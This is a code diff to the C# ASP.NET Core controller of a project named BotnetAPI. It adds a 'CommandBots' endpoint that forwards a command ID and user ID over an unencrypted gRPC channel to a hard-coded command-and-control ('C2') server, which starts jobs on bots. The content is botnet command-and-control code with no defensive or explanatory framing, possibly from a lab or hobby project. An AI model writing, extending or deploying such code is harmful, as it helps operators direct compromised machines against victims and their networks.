@@ -6,6 +6,8 @@ using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
 using BotnetAPI.Models;
+using System.Net.Http;
+using Grpc.Core;
 
 namespace BotnetAPI.Controllers
 {
@@ -88,6 +90,17 @@ namespace BotnetAPI.Controllers
             await _context.SaveChangesAsync();
 
             return CreatedAtAction(nameof(GetBot), new { id = bot.Id }, bot);
+        }
+
+        // POST: api/Bots/CommandBots
+        [HttpPost]
+        [Route("CommandBots")]
+        public async Task<ActionResult<StartJobResponse>> CommandBots(StartJobRequestDTO request)
+        {
+            var channel = new Channel("192.168.175.129:4590", ChannelCredentials.Insecure);
+            var client = new C2.C2Client(channel);
+            var response = await client.StartJobAsync(new StartJobRequest { CommandId = request.CommandId, UserId = request.UserId });
+            return response;
         }
 
         // DELETE: api/Bots/5
